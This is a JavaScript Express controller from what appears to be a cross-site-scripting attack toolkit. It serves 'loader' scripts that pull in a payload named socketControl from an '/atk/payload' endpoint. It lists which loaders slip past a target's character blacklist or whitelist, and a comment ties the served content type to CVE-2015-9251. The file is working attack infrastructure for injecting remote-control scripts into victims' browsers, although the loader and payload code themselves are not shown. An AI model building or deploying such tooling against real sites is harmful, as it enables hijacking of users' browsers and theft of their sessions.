const listDir = require('../lib/listDir.js')
const { resolve } = require('path')
const ld = require('lodash')

const payloadUrl = 'http://localhost:3000/atk/payload/socketControl'

let loaders = () => { console.log('Not ready') }

loadLoaders().then((loaderGetter) => {
  loaders = loaderGetter
})

async function loadLoaders () {
  let loaders = await listDir(resolve('./loaders/'))
  let loaderMap = {}
  while (loaders.length > 0) {
    let loader = loaders.shift()
    ld.set(loaderMap, ld.trimEnd(loader, '.js'), require(`../loaders/${loader}`))
  }
  return {
    get: (key) => {
      return loaderMap[key] || 'Not a loader'
    },
    list: () => {
      return Object.keys(loaderMap)
    }
  }
}

const controller = {
  get: (req, res) => {
    // May need to be text/javascript for CVE-2015-9251
    res.set('Content-Type', 'application/javascript')
    console.log('loader', loaders.get(req.params.loader))
    return res.send(
      loaders.get(req.params.loader).script({ PAYLOAD_URL: payloadUrl })
    )
  },

  list: (req, res) => {
    return res.json(loaders.list())
  },

  listNotInFilter: (req, res) => {
    const blacklist = req.params.filter
    return res.json(loaders.list().reduce((loaderList, key) => {
      if (loaders.get(key).charset.allowedByBlacklist(blacklist)) {
        loaderList.push(key)
      }
      return loaderList
    }, []))
  },

  listInFilter: (req, res) => {
    const whitelist = req.params.filter
    return res.json(loaders.list().reduce((loaderList, key) => {
      if (loaders.get(key).charset.allowedByWhitelist(whitelist)) {
        loaderList.push(key)
      }
      return loaderList
    }, []))
  }
}

module.exports = controller
